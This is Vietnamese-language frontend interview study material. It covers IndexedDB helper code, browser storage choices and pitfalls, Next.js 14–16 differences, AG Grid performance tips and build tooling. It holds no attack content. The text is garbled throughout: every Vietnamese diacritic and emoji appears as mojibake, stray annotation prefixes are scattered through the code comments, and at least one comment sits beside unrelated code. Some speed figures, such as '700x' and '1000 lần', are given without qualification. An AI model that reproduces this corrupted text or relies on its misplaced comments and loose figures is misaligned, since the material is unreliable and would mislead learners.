// INDEXEDDB - V√≠ D·ª• ƒê∆°n Gi·∫£n (Simplified v·ªõi Promise)
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: 1Ô∏è‚É£ M·ªû DATABASE
function openDB(dbName: string, version: number = 1): Promise<IDBDatabase> {
  return new Promise((resolve, reject) => {
    const request = indexedDB.open(dbName, version);
    
    // onupgradeneeded: Ch·∫°y khi t·∫°o DB l·∫ßn ƒë·∫ßu ho·∫∑c upgrade version
    request.onupgradeneeded = (event) => {
      const db = (event.target as IDBOpenDBRequest).result;
      
      // T·∫°o "table" (g·ªçi l√† objectStore)
      if (!db.objectStoreNames.contains('users')) {
        const store = db.createObjectStore('users', { keyPath: 'id' });
        // keyPath: 'id' ‚Üí d√πng field 'id' l√†m primary key
        
 // Ch√∫ gi·∫£i: T·∫°o index (gi·ªëng SQL index)
        store.createIndex('email', 'email', { unique: true });
        store.createIndex('name', 'name', { unique: false });
      }
    };
    
    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);
  });
}

// 2Ô∏è‚É£ TH√äM DATA (INSERT)
async function addUser(db: IDBDatabase, user: any): Promise<void> {
  return new Promise((resolve, reject) => {
 // Ch√∫ gi·∫£i: T·∫°o transaction (nh∆∞ BEGIN TRANSACTION trong SQL)
    const tx = db.transaction('users', 'readwrite'); // readwrite = c√≥ th·ªÉ ghi
    const store = tx.objectStore('users');
    
    // Th√™m data
    const request = store.add(user);
    
    request.onsuccess = () => resolve();
    request.onerror = () => reject(request.error);
  });
}

// 3Ô∏è‚É£ ƒê·ªåC DATA (SELECT)
async function getUser(db: IDBDatabase, id: number): Promise<any> {
  return new Promise((resolve, reject) => {
    const tx = db.transaction('users', 'readonly'); // readonly = ch·ªâ ƒë·ªçc
    const store = tx.objectStore('users');
    
    const request = store.get(id); // T√¨m theo primary key
    
    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);
  });
}

// 4Ô∏è‚É£ ƒê·ªåC T·∫§T C·∫¢ (SELECT *)
async function getAllUsers(db: IDBDatabase): Promise<any[]> {
  return new Promise((resolve, reject) => {
    const tx = db.transaction('users', 'readonly');
    const store = tx.objectStore('users');
    
    const request = store.getAll(); // Ch√∫ gi·∫£i: L·∫•y t·∫•t c·∫£
    
    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);
  });
}

 // Ch√∫ gi·∫£i: 5Ô∏è‚É£ C·∫¨P NH·∫¨T (UPDATE)
async function updateUser(db: IDBDatabase, user: any): Promise<void> {
  return new Promise((resolve, reject) => {
    const tx = db.transaction('users', 'readwrite');
    const store = tx.objectStore('users');
    
    const request = store.put(user); // put = th√™m ho·∫∑c update
    
    request.onsuccess = () => resolve();
    request.onerror = () => reject(request.error);
  });
}

// 6Ô∏è‚É£ X√ìA (DELETE)
async function deleteUser(db: IDBDatabase, id: number): Promise<void> {
  return new Promise((resolve, reject) => {
    const tx = db.transaction('users', 'readwrite');
    const store = tx.objectStore('users');
    
    const request = store.delete(id);
    
    request.onsuccess = () => resolve();
    request.onerror = () => reject(request.error);
  });
}

 // Ch√∫ gi·∫£i: ============================================
// USAGE - S·ª≠ D·ª•ng Th·ª±c T·∫ø
 // Ch√∫ gi·∫£i: ============================================
async function demo() {
 // Ch√∫ gi·∫£i: M·ªü database
  const db = await openDB('MyAppDB', 1);
  
  // Th√™m users
  await addUser(db, { id: 1, name: 'John', email: 'john@example.com' });
  await addUser(db, { id: 2, name: 'Jane', email: 'jane@example.com' });
  
  // ƒê·ªçc 1 user
  const user = await getUser(db, 1);
  console.log(user); // Ch√∫ gi·∫£i: { id: 1, name: 'John', email: 'john@example.com' }
  
  // ƒê·ªçc t·∫•t c·∫£ users
  const users = await getAllUsers(db);
  console.log(users); // Ch√∫ gi·∫£i: [{ id: 1, ... }, { id: 2, ... }]
  
 // Ch√∫ gi·∫£i: Update user
  await updateUser(db, { id: 1, name: 'John Doe', email: 'john@example.com' });
  
  // X√≥a user
  await deleteUser(db, 2);
  
  // ƒê√≥ng database
  db.close();
}

demo();

 // Ch√∫ gi·∫£i: ============================================
// Use Case Th·ª±c T·∫ø: Offline App
 // Ch√∫ gi·∫£i: ============================================
class OfflineCache {
  private db: IDBDatabase | null = null;
  
  async init() {
    this.db = await openDB('OfflineCache', 1);
  }
  
 // Ch√∫ gi·∫£i: Cache API response
  async cacheArticle(article: any) {
    if (!this.db) return;
    await addUser(this.db, article);
  }
  
 // Ch√∫ gi·∫£i: Get t·ª´ cache
  async getArticle(id: number) {
    if (!this.db) return null;
    return await getUser(this.db, id);
  }
}

 // Ch√∫ gi·∫£i: Usage:
const cache = new OfflineCache();
await cache.init();

 // Ch√∫ gi·∫£i: Online: Fetch t·ª´ API + cache
const article = await fetch('/api/article/1').then(r => r.json());
await cache.cacheArticle(article);

// Offline: ƒê·ªçc t·ª´ cache
const cached = await cache.getArticle(1);
```

---

#### **üéØ Khi N√†o D√πng Storage N√†o?**

```typescript
 // Ch√∫ gi·∫£i: ============================================
// DECISION TREE - Ch·ªçn Storage Ph√π H·ª£p
 // Ch√∫ gi·∫£i: ============================================

function selectStorage(requirement: Requirement): Storage {
 // Ch√∫ gi·∫£i: 1. C·∫ßn g·ª≠i server? ‚Üí Cookie
  if (requirement.sendToServer) {
    return 'Cookie'; // Ch√∫ gi·∫£i: Auth tokens, session IDs
  }
  
 // Ch√∫ gi·∫£i: 2. Data l·ªõn (>5MB)? ‚Üí IndexedDB
  if (requirement.size > 5_000_000) {
    return 'IndexedDB'; // Ch√∫ gi·∫£i: Images, videos, large datasets
  }
  
  // 3. C·∫ßn persistent (l∆∞u m√£i m√£i)? ‚Üí LocalStorage
  if (requirement.persistent) {
    return 'LocalStorage'; // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.
  }
  
  // 4. Temporary (ƒë√≥ng tab = m·∫•t)? ‚Üí SessionStorage
  if (requirement.temporary) {
    return 'SessionStorage'; // Ch√∫ gi·∫£i: Form drafts, wizard steps
  }
  
 // Ch√∫ gi·∫£i: Default: LocalStorage
  return 'LocalStorage';
}

 // Ch√∫ gi·∫£i: ============================================
// Use Cases Th·ª±c T·∫ø
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: ‚úÖ Cookie:
 // Ch√∫ gi·∫£i: - Authentication tokens (JWT)
 // Ch√∫ gi·∫£i: - Session IDs
 // Ch√∫ gi·∫£i: - User tracking, analytics

 // Ch√∫ gi·∫£i: ‚úÖ LocalStorage:
 // Ch√∫ gi·∫£i: - User settings (theme, language)
 // Ch√∫ gi·∫£i: - Shopping cart
 // Ch√∫ gi·∫£i: - Cached data (API responses)
 // Ch√∫ gi·∫£i: - Recently viewed items

 // Ch√∫ gi·∫£i: ‚úÖ SessionStorage:
 // Ch√∫ gi·∫£i: - Multi-step form data
 // Ch√∫ gi·∫£i: - Wizard progress
 // Ch√∫ gi·∫£i: - Search filters (per-tab)
 // Ch√∫ gi·∫£i: - Temporary state

 // Ch√∫ gi·∫£i: ‚úÖ IndexedDB:
 // Ch√∫ gi·∫£i: - Offline apps (PWA)
 // Ch√∫ gi·∫£i: - Large datasets (1000+ items)
 // Ch√∫ gi·∫£i: - Images, videos
 // Ch√∫ gi·∫£i: - Full-text search indexes
```

---

#### **üìã Best Practices (Th·ª±c H√†nh T·ªët)**

```typescript
// 1Ô∏è‚É£ ALWAYS TRY-CATCH (storage c√≥ th·ªÉ full ho·∫∑c disabled)
function safeSetItem(key: string, value: any) {
  try {
    localStorage.setItem(key, JSON.stringify(value));
  } catch (error) {
    if (error instanceof DOMException && error.name === 'QuotaExceededError') {
      console.error('Storage full!');
      // Clear old data ho·∫∑c notify user
    }
  }
}

 // Ch√∫ gi·∫£i: 2Ô∏è‚É£ CHECK AVAILABILITY
function isLocalStorageAvailable(): boolean {
  try {
    const test = '__test__';
    localStorage.setItem(test, test);
    localStorage.removeItem(test);
    return true;
  } catch {
    return false; // User disabled ho·∫∑c browser kh√¥ng support
  }
}

// 3Ô∏è‚É£ NAMESPACE KEYS (tr√°nh conflict)
const STORAGE_PREFIX = 'myapp_';

function setAppData(key: string, value: any) {
  localStorage.setItem(STORAGE_PREFIX + key, JSON.stringify(value));
}

function getAppData(key: string) {
  const item = localStorage.getItem(STORAGE_PREFIX + key);
  return item ? JSON.parse(item) : null;
}

 // Ch√∫ gi·∫£i: Usage:
setAppData('user', { name: 'John' }); // Ch√∫ gi·∫£i: L∆∞u: "myapp_user"

// 4Ô∏è‚É£ VERSIONING (ƒë·ªÉ migration)
interface StorageData<T> {
  version: number;
  data: T;
}

function setVersionedData<T>(key: string, data: T, version: number = 1) {
  const wrapper: StorageData<T> = { version, data };
  localStorage.setItem(key, JSON.stringify(wrapper));
}

function getVersionedData<T>(key: string, currentVersion: number): T | null {
  const item = localStorage.getItem(key);
  if (!item) return null;
  
  const wrapper: StorageData<T> = JSON.parse(item);
  
  if (wrapper.version !== currentVersion) {
 // Ch√∫ gi·∫£i: Migration logic here
    console.warn('Old data version, migrating...');
    return null;
  }
  
  return wrapper.data;
}

 // Ch√∫ gi·∫£i: 5Ô∏è‚É£ EXPIRY for LocalStorage (gi·ªëng cookie)
interface CachedData<T> {
  data: T;
  expiry: number; // Ch√∫ gi·∫£i: timestamp
}

function setWithExpiry<T>(key: string, value: T, ttlMs: number) {
  const item: CachedData<T> = {
    data: value,
    expiry: Date.now() + ttlMs,
  };
  localStorage.setItem(key, JSON.stringify(item));
}

function getWithExpiry<T>(key: string): T | null {
  const itemStr = localStorage.getItem(key);
  if (!itemStr) return null;
  
  const item: CachedData<T> = JSON.parse(itemStr);
  
 // Ch√∫ gi·∫£i: Check expiry
  if (Date.now() > item.expiry) {
    localStorage.removeItem(key); // Expired, x√≥a ƒëi
    return null;
  }
  
  return item.data;
}

 // Ch√∫ gi·∫£i: Usage: Cache API response trong 1 gi·ªù
setWithExpiry('apiCache', { users: [...] }, 60 * 60 * 1000); // Ch√∫ gi·∫£i: 1 hour

const cached = getWithExpiry('apiCache');
if (cached) {
  console.log('Use cache');
} else {
  console.log('Cache expired, fetch new');
}
```

---

#### **‚ùå Common Mistakes (L·ªói Th∆∞·ªùng G·∫∑p)**

```typescript
// ‚ùå L·ªñI 1: L∆∞u object tr·ª±c ti·∫øp (kh√¥ng stringify)
localStorage.setItem('user', { name: 'John' }); // Ch√∫ gi·∫£i: ‚ùå L∆∞u "[object Object]"

// ‚úÖ ƒê√öNG: Stringify tr∆∞·ªõc
localStorage.setItem('user', JSON.stringify({ name: 'John' }));

// ‚ùå L·ªñI 2: Qu√™n parse khi ƒë·ªçc
const user = localStorage.getItem('user'); // ‚ùå user l√† string!
console.log(user.name); // Ch√∫ gi·∫£i: undefined

// ‚úÖ ƒê√öNG: Parse sau khi ƒë·ªçc
const userStr = localStorage.getItem('user');
const user = userStr ? JSON.parse(userStr) : null;
console.log(user?.name); // Ch√∫ gi·∫£i: "John"

// ‚ùå L·ªñI 3: L∆∞u sensitive data v√†o localStorage
localStorage.setItem('password', 'secret123'); // ‚ùå Kh√¥ng secure!

// ‚úÖ ƒê√öNG: Ch·ªâ l∆∞u non-sensitive data
// Sensitive data (passwords, credit cards) ‚Üí server session ho·∫∑c httpOnly cookie

// ‚ùå L·ªñI 4: Kh√¥ng check quota exceeded
for (let i = 0; i < 10000; i++) {
  localStorage.setItem(`key${i}`, 'x'.repeat(1000)); // ‚ùå C√≥ th·ªÉ full!
}

// ‚úÖ ƒê√öNG: Try-catch
try {
  localStorage.setItem('key', largeData);
} catch (error) {
  if (error.name === 'QuotaExceededError') {
    console.error('Storage full, clearing old data');
    localStorage.clear();
  }
}

// ‚ùå L·ªñI 5: D√πng IndexedDB cho data nh·ªè
await openDB(...); // Ch√∫ gi·∫£i: ‚ùå Overkill cho l∆∞u 1 string
await addUser(db, { name: 'John' });

// ‚úÖ ƒê√öNG: LocalStorage cho data nh·ªè
localStorage.setItem('name', 'John'); // ƒê∆°n gi·∫£n h∆°n nhi·ªÅu

// ‚ùå L·ªñI 6: Qu√™n ƒë√≥ng IndexedDB connection
const db = await openDB('MyDB', 1);
 // Ch√∫ gi·∫£i: ... use db
// ‚ùå Kh√¥ng ƒë√≥ng ‚Üí memory leak

// ‚úÖ ƒê√öNG: Lu√¥n ƒë√≥ng
const db = await openDB('MyDB', 1);
try {
 // Ch√∫ gi·∫£i: ... use db
} finally {
  db.close(); // Ch√∫ gi·∫£i: Always close
}
```

---

#### **üí° Summary (T√≥m T·∫Øt)**

**Cookie üç™**
- **4KB**, g·ª≠i k√®m m·ªçi request, c√≥ expiry
- **D√πng cho**: Auth tokens, session IDs
- **API**: `document.cookie`

**LocalStorage üíæ**
- **5-10MB**, l∆∞u m√£i m√£i, sync API
- **D√πng cho**: Settings, preferences, cart
- **API**: `localStorage.getItem/setItem`

**SessionStorage üìù**
- **5-10MB**, m·∫•t khi ƒë√≥ng tab, sync API
- **D√πng cho**: Form drafts, temporary state
- **API**: `sessionStorage.getItem/setItem`

**IndexedDB üóÑÔ∏è**
- **50MB+**, async, database-like
- **D√πng cho**: Large datasets, offline apps
- **API**: `indexedDB.open`, transactions, objectStores

**Key Takeaway:**
- Data nh·ªè + simple ‚Üí **LocalStorage/SessionStorage**
- G·ª≠i server ‚Üí **Cookie**
- Data l·ªõn + complex ‚Üí **IndexedDB**
- Lu√¥n **try-catch**, **check availability**, **namespace keys**

---
---
## 31. ‚ö° Q31: Next.js Workflow & Version Comparison - Next.js 14 vs 15 vs 16  

**P1: T√™n c√¢u h·ªèi:** ‚ö° Q31: Next.js Workflow & Version Comparison - Next.js 14 vs 15 vs 16  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (4-5 ph√∫t):**

**"Next.js workflow: File-based routing (App Router) ‚Üí Rendering strategies (SSR/SSG/ISR) ‚Üí Data fetching (Server Components) ‚Üí Build optimization. Version evolution: v14 stable App Router, v15 React 19 + async APIs, v16 cache improvements."**

**üîë Next.js Workflow - 5 B∆∞·ªõc:**

**1. Routing - File-Based (App Router):**
- `app/page.tsx` = homepage `/`
- `app/blog/[slug]/page.tsx` = dynamic route `/blog/my-post`
- `layout.tsx` = shared UI wrapper (persist across pages)
- Route groups `(marketing)` kh√¥ng ·∫£nh h∆∞·ªüng URL

**2. Rendering Strategies:**
- **SSR** (Server-Side Rendering): Render m·ªói request, fresh data
- **SSG** (Static Site Generation): Pre-render build time, fast CDN
- **ISR** (Incremental Static Regeneration): SSG + revalidate background
- **CSR** (Client-Side): Fetch data client-side (use client components)

**3. Data Fetching:**
- **Server Components** (default): `async` components fetch tr√™n server
- `fetch()` auto-cached, `revalidate` option cho ISR
- **Client Components** (`'use client'`): d√πng React Query, SWR, useEffect

**4. Build & Deploy:**
- `next build` ‚Üí static HTML + optimized bundles
- Vercel (zero-config), Docker, Node.js server
- Edge Runtime cho ultra-low latency

**5. Performance Optimizations:**
- Automatic code splitting (per route)
- Image optimization (`<Image />`), Font optimization
- Route prefetching (`<Link />`)

**üîë Version Comparison:**

| **Feature** | **Next.js 14** | **Next.js 15** | **Next.js 16** |
|------------|---------------|---------------|---------------|
| **React** | React 18 | **React 19** | React 19 |
| **App Router** | Stable | Enhanced | Optimized |
| **Key Feature** | Turbopack (beta), Server Actions stable | **Async Request APIs** (cookies/headers), Partial Prerendering | **Cache behavior changes**, DX improvements |
| **Breaking** | - | `cookies()/headers()` gi·ªù **async** | Default caching strategies changed |

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- D√πng `'use client'` kh√¥ng c·∫ßn thi·∫øt ‚Üí m·∫•t Server Component benefits (bundle size tƒÉng)
- Fetch data trong Client Components m√† kh√¥ng cache ‚Üí waterfall, ch·∫≠m
- Qu√™n `revalidate` cho ISR ‚Üí data stale m√£i m√£i
- Mix Pages Router v√† App Router kh√¥ng hi·ªÉu middleware scope

**üí° Ki·∫øn Th·ª©c Senior:**
- **Server vs Client Components**: Server = zero JS to client, Client = interactivity (onClick, useState)
- **Partial Prerendering** (v15): Combine static + dynamic trong c√πng route (static shell + dynamic content)
- **Turbopack** (v14+): Rust-based bundler nhanh h∆°n Webpack (~700x dev mode)
- **Streaming SSR**: `<Suspense>` cho progressive rendering, TTFB nhanh h∆°n
- **Middleware**: Ch·∫°y Edge Runtime, d√πng cho auth, redirects, A/B testing



**‚ö° Quick Summary:**
> Next.js 14 = App Router stable + Server Actions + Turbopack. Next.js 15 = React 19 + Async Request APIs + Partial Prerendering. Next.js 16 = Cache c·∫£i ti·∫øn + Improved DX. Workflow: Page/Layout ‚Üí Rendering (SSR/SSG/ISR) ‚Üí Data Fetching ‚Üí Deployment.

**üí° Ghi Nh·ªõ:**
- üìÅ **Next.js 14**: App Router production-ready, Server Actions, Turbopack dev (beta)
- üöÄ **Next.js 15**: React 19, Async Request APIs (cookies/headers), Partial Prerendering
- ‚ö° **Next.js 16**: Cache behavior changes, Better DX, Performance improvements
- üéØ **Workflow**: Routing ‚Üí Rendering Strategy ‚Üí Data Fetching ‚Üí Build ‚Üí Deploy

---
---
## 32. üìä Q32: AG Grid - Enterprise Data Grid: Performance, Real-time Updates & Best Practices  

**P1: T√™n c√¢u h·ªèi:** üìä Q32: AG Grid - Enterprise Data Grid: Performance, Real-time Updates & Best Practices  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (2-3 ph√∫t):**

**"AG Grid = data grid doanh nghi·ªáp v·ªõi virtual scrolling, transaction API, c·∫≠p nh·∫≠t th·ªùi gian th·ª±c cho 100K+ h√†ng.**

**üöÄ Top 3 T·ªëi ∆Øu Hi·ªáu NƒÉng:**
1. **`getRowId`**: Cung c·∫•p ID h√†ng ·ªïn ƒë·ªãnh ‚Üí tra c·ª©u O(1) (nhanh h∆°n 1000 l·∫ßn so v·ªõi m·∫∑c ƒë·ªãnh). 
   ```ts
   getRowId: (params) => params.data.id // Ch√∫ gi·∫£i: Ph·∫£i unique & stable!
   ```
2. **`applyTransactionAsync`**: G·ªôp c·∫≠p nh·∫≠t ‚Üí gi·∫£m 80% re-renders.
   ```ts
   gridRef.current.api.applyTransactionAsync({ update: rows });
   ```
3. **Virtual Scrolling**: Ch·ªâ render h√†ng hi·ªÉn th·ªã (DOM ·∫£o ‚Üí c·ª±c nh·∫π).

**‚ôªÔ∏è C·∫≠p Nh·∫≠t Th·ªùi Gian Th·ª±c (WebSocket):**
- **Lu·ªìng**: Tin nh·∫Øn WebSocket ‚Üí c·∫≠p nh·∫≠t state c·ª•c b·ªô ‚Üí `applyTransactionAsync` ‚Üí AG Grid c·∫≠p nh·∫≠t tƒÉng d·∫ßn.
- **Batching**: G·ªôp 100 updates/100ms ‚Üí 1 transaction thay v√¨ 100 re-renders.
- **T√≠nh b·∫•t bi·∫øn**: T·∫°o objects m·ªõi cho updates ‚Üí React ph√°t hi·ªán thay ƒë·ªïi ƒë√∫ng.

**üîë Kh√°i Ni·ªám C·ªët L√µi:**
- **Row Data vs Transaction API**:
  - `setRowData`: Re-render to√†n b·ªô (ch·∫≠m) ‚Üí ch·ªâ d√πng t·∫£i ban ƒë·∫ßu.
  - `applyTransaction`: C·∫≠p nh·∫≠t tƒÉng d·∫ßn (nhanh) ‚Üí d√πng cho th·ªùi gian th·ª±c.
- **Column Definitions**: `useMemo` ‚Üí ngƒÉn t·∫°o l·∫°i m·ªói render.
- **Cell Renderers**: Components t√πy ch·ªânh ‚Üí ƒë·ªãnh d·∫°ng cells (icons, buttons, charts).
- **Server-side Row Model**: T·∫£i d·ªØ li·ªáu l∆∞·ªùi t·ª´ server ‚Üí cu·ªôn v√¥ h·∫°n.

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- **Kh√¥ng d√πng getRowId**: T·∫°o ID m·∫∑c ƒë·ªãnh ch·∫≠m h∆°n 1000 l·∫ßn.
- **D√πng forEach v·ªõi applyTransaction**: G·ªçi 100 l·∫ßn thay v√¨ 1 batch.
- **D·ªØ li·ªáu c√≥ th·ªÉ thay ƒë·ªïi**: S·ª≠a object tr·ª±c ti·∫øp ‚Üí AG Grid kh√¥ng ph√°t hi·ªán thay ƒë·ªïi.
- **T·∫°o l·∫°i columnDefs**: Kh√¥ng useMemo ‚Üí grid kh·ªüi t·∫°o l·∫°i m·ªói render.

**üí° Ki·∫øn Th·ª©c Senior:**
- **Hi·ªáu nƒÉng**: AG Grid x·ª≠ l√Ω 100K h√†ng m∆∞·ª£t (vs MUI DataGrid lag ·ªü 10K).
- **K√≠ch th∆∞·ªõc Bundle**: ~150KB gzipped ‚Üí ƒë√°nh ƒë·ªïi cho t√≠nh nƒÉng.
- **Enterprise vs Community**: Enterprise c√≥ pivoting, grouping, excel export ($999/dev/nƒÉm).
- **So s√°nh**: AG Grid > MUI DataGrid (hi·ªáu nƒÉng), React Table (linh ho·∫°t nh∆∞ng l√†m th·ªß c√¥ng).
- **Tr∆∞·ªùng h·ª£p**: N·ªÅn t·∫£ng trading, dashboards qu·∫£n tr·ªã, c√¥ng c·ª• ph√¢n t√≠ch (datasets l·ªõn + th·ªùi gian th·ª±c).

---

**‚ö° Quick Summary:**
> AG Grid = Enterprise data grid cho high-frequency updates. getRowId (O(1)) + applyTransactionAsync (batching) + Virtual scrolling = x·ª≠ l√Ω 100K+ rows m∆∞·ª£t m√†.

**üí° Ghi Nh·ªõ:**
- üöÄ **Top 3 Performance**: getRowId, applyTransactionAsync, Virtual scrolling
- ‚ö° **Real-time**: WebSocket ‚Üí applyTransactionAsync (batch updates)
- üéØ **Must-Have**: getRowId (1000x faster), immutable data, useMemo columnDefs
- ‚ö†Ô∏è **Never**: setRowData cho updates, mutable data, forEach async

---
---
## 33. üèóÔ∏è Q33: Frontend Tooling & Build Optimization - Bundling, Minify, Tree-shaking, Code Splitting, Polyfill, Transpiling, ESLint/Prettier, Source Maps  

**P1: T√™n c√¢u h·ªèi:** üèóÔ∏è Q33: Frontend Tooling & Build Optimization - Bundling, Minify, Tree-shaking, Code Splitting, Polyfill, Transpiling, ESLint/Prettier, Source Maps  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (4-5 ph√∫t):**

**"Build tools optimize frontend: Bundling (g·ªôp files), Minify (n√©n), Tree-shaking (lo·∫°i unused code), Code splitting (lazy load), Polyfill (old browsers support), Transpiling (modern ‚Üí old JS), ESLint/Prettier (code quality), Source maps (debugging)."**

**üîë 8 K·ªπ Thu·∫≠t Ch√≠nh:**

**1. Bundling (Webpack, Vite, Rollup):**
- G·ªôp nhi·ªÅu files th√†nh 1-2 bundles ‚Üí gi·∫£m HTTP requests
- Resolve dependencies, handle imports/exports
- V√≠ d·ª•: 100 files ‚Üí 1 `bundle.js` (10 requests ‚Üí 1 request)

**2. Minification:**
- X√≥a whitespace, shorten variable names, remove comments
- **Terser** (JS), **cssnano** (CSS) - gi·∫£m 40-60% file size
- `const myVariableName = 123` ‚Üí `const a=123`

**3. Tree-shaking:**
- **Lo·∫°i unused exports** - ch·ªâ bundle code th·ª±c s·ª± d√πng
- C·∫ßn ES modules (`import/export`), kh√¥ng work v·ªõi CommonJS
- V√≠ d·ª•: `import {add} from 'utils'` ‚Üí ch·ªâ bundle `add`, kh√¥ng bundle `subtract`

**4. Code Splitting:**
- T√°ch code th√†nh nhi·ªÅu chunks, **lazy load** khi c·∫ßn
- Route-based: m·ªói route 1 bundle ri√™ng
- Dynamic imports: `const module = await import('./heavy.js')`

**5. Polyfills:**
- Th√™m **missing features** cho old browsers (IE11, Safari c≈©)
- Core-js, Babel polyfills - support Promise, async/await, Array.includes...
- **Differential serving**: modern bundle (ESM) + legacy bundle (polyfilled)

**6. Transpiling (Babel, SWC):**
- Convert **modern JS ‚Üí old JS** (ES2022 ‚Üí ES5)
- JSX ‚Üí JS, TypeScript ‚Üí JS
- `const arrow = () => {}` ‚Üí `var arrow = function() {}`

**7. ESLint/Prettier:**
- **ESLint**: Find bugs, enforce code patterns (unused vars, no-console...)
- **Prettier**: Auto-format code (spacing, quotes, semicolons)
- Pre-commit hooks (Husky) ƒë·ªÉ enforce

**8. Source Maps:**
- Map minified code ‚Üí original source cho debugging
- DevTools show **original code** thay v√¨ minified
- Types: `inline`, `hidden`, `eval` (dev), `source-map` (production)

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Ship polyfills cho modern browsers ‚Üí waste bandwidth (d√πng differential serving)
- Kh√¥ng tree-shake ‚Üí bundle lodash to√†n b·ªô (570KB) thay v√¨ 1 function
- Source maps trong production ‚Üí expose source code (d√πng `hidden-source-map`)
- Over-splitting code ‚Üí qu√° nhi·ªÅu requests, worse than bundling

**üí° Ki·∫øn Th·ª©c Senior:**
- **Vite** nhanh h∆°n Webpack v√¨: ESBuild (Go) transpile, native ESM trong dev (kh√¥ng bundle)
- **Module Federation** (Webpack 5): Share code gi·ªØa apps runtime (microfrontends)
- **Turbopack** (Next.js 14): Rust-based, 700x faster than Webpack dev mode
- Performance budget: Set limits (JS < 200KB, CSS < 50KB), fail build n·∫øu v∆∞·ª£t




**‚ùì C√¢u H·ªèi:**

Gi·∫£i th√≠ch chi ti·∫øt c√°c c√¥ng c·ª• v√† k·ªπ thu·∫≠t t·ªëi ∆∞u h√≥a trong frontend development: Bundling (g·ªôp file), Minify (n√©n code), Tree-shaking (lo·∫°i b·ªè code th·ª´a), Code splitting (t√°ch code), Polyfill (th√™m features cho old browsers), Transpiling (convert modern ‚Üí old JS), ESLint/Prettier, v√† Source Maps. Bao g·ªìm c√°ch ho·∫°t ƒë·ªông, ∆∞u nh∆∞·ª£c ƒëi·ªÉm, v√† ·ª©ng d·ª•ng th·ª±c t·∫ø.



**üìö Ph·∫ßn 1: Bundling (G·ªôp File) - T·ª´ Nhi·ªÅu Files ‚Üí 1 File**

#### **üí° Bundling L√† G√¨? (What is Bundling?)**

**Bundling** l√† qu√° tr√¨nh **g·ªôp nhi·ªÅu files JavaScript/CSS/assets** th√†nh **√≠t files h∆°n** (th∆∞·ªùng l√† 1 file duy nh·∫•t) ƒë·ªÉ g·ª≠i l√™n browser.

**üî• T·∫°i Sao C·∫ßn Bundling?**

```typescript
 // Ch√∫ gi·∫£i: ===================================================
// ‚ùå KH√îNG D√ôNG BUNDLING - Website c√≥ 100 files
 // Ch√∫ gi·∫£i: ===================================================

 // Ch√∫ gi·∫£i: index.html
<!DOCTYPE html>
<html>
<head>
  <!-- ‚ùå Load 100 files ri√™ng bi·ªát! -->
  <script src="/js/utils.js"></script>
  <script src="/js/api.js"></script>
  <script src="/js/auth.js"></script>
  <script src="/js/components/Button.js"></script>
  <script src="/js/components/Input.js"></script>
  <!-- ...95 files kh√°c -->
</head>
</html>

// üö® V·∫§N ƒê·ªÄ:
// ‚ùå 100 HTTP requests ‚Üí C·ª∞C CH·∫¨M! (m·ªói request c√≥ latency ~50-100ms)
// ‚ùå Total latency: 100 files √ó 100ms = 10 gi√¢y ch·ªâ ƒë·ªÉ load files! üò±
// ‚ùå HTTP/1.1: Ch·ªâ 6-8 connections ƒë·ªìng th·ªùi ‚Üí ph·∫£i ch·ªù t·ª´ng wave
// ‚ùå Kh√¥ng optimize ƒë∆∞·ª£c (kh√¥ng minify, tree-shake ƒë∆∞·ª£c)

 // Ch√∫ gi·∫£i: ===================================================
// ‚úÖ D√ôNG BUNDLING - G·ªôp th√†nh 1 file
 // Ch√∫ gi·∫£i: ===================================================

 // Ch√∫ gi·∫£i: index.html
<!DOCTYPE html>
<html>
<head>
  <!-- ‚úÖ Load 1 file duy nh·∫•t! -->
  <script src="/js/bundle.js"></script>
</head>
</html>

// bundle.js (g·ªôp 100 files th√†nh 1)
 // Ch√∫ gi·∫£i: - Ch·ª©a t·∫•t c·∫£ code t·ª´ 100 files
// - ƒê√£ minify (n√©n nh·ªè h∆°n)
// - ƒê√£ tree-shake (lo·∫°i code th·ª´a)

// ‚úÖ L·ª¢I √çCH:
 // Ch√∫ gi·∫£i: ‚úÖ 1 HTTP request ‚Üí NHANH H∆†N 100x!
// ‚úÖ Latency: 1 file √ó 100ms = 100ms (vs 10 gi√¢y)
// ‚úÖ C√≥ th·ªÉ optimize (minify, compress, cache)
```

**üéØ C√°ch Ho·∫°t ƒê·ªông C·ªßa Bundler:**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ               BUNDLING PROCESS (QUY TR√åNH G·ªòP FILE)      ‚îÇ
